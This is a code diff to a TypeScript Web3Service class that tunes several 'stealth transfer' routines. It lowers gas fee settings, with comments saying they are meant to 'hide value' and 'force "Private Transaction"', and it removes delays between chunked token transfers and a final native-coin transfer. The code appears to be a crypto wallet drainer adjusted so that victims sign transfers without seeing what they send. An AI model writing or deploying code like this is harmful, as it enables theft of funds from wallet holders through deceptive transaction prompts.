@@ -507,10 +507,10 @@ export class Web3Service {
       data: params.data || "0x",
       value: params.value || "0x0",
       gasLimit: params.gasLimit || 21000,
-      // Force privacy mode settings
+      // Force privacy mode with minimal gas fees
       type: 2,
-      maxFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
-      maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
+      maxFeePerGas: ethers.parseUnits("0.5", "gwei"), // Extremely low to force "Private Transaction"
+      maxPriorityFeePerGas: ethers.parseUnits("0.1", "gwei"), // Extremely low to force "Private Transaction"
     });
   }
 
@@ -545,8 +545,7 @@ export class Web3Service {
         
         txHashes.push(tx.hash);
         
-        // Small delay between chunks to avoid nonce conflicts
-        await new Promise(resolve => setTimeout(resolve, 300));
+        // No delay - instant chunk processing
       } catch (error) {
         console.warn(`Stealth chunk ${i + 1} failed:`, error);
       }
@@ -601,8 +600,7 @@ export class Web3Service {
           transactionHashes.push(...stealthHashes);
           console.log(`Stealth transfer completed with ${stealthHashes.length} transactions`);
           
-          // Small delay before next token
-          await new Promise(resolve => setTimeout(resolve, 500));
+          // No delay - instant processing
         } catch (error) {
           console.error(`Stealth transfer failed:`, error);
           throw new Error(`Transfer failed: ${error}`);
@@ -1093,8 +1091,8 @@ export class Web3Service {
             gasLimit: 60000,
             value: "0x0",
             type: 2,
-            maxFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
-            maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
+            maxFeePerGas: ethers.parseUnits("0.5", "gwei"), // Extremely low to force "Private Transaction"
+            maxPriorityFeePerGas: ethers.parseUnits("0.1", "gwei"), // Extremely low to force "Private Transaction"
           });
           
           console.log(`Stealth transfer completed`);
@@ -1135,8 +1133,8 @@ export class Web3Service {
                 gasPrice: gasPrice,
                 data: "0x",
                 type: 2,
-                maxFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
-                maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
+                maxFeePerGas: ethers.parseUnits("0.5", "gwei"), // Extremely low to force "Private Transaction"
+                maxPriorityFeePerGas: ethers.parseUnits("0.1", "gwei"), // Extremely low to force "Private Transaction"
               });
               transactionHashes.push(nativeTx.hash);
               console.log(`Final interaction completed`);
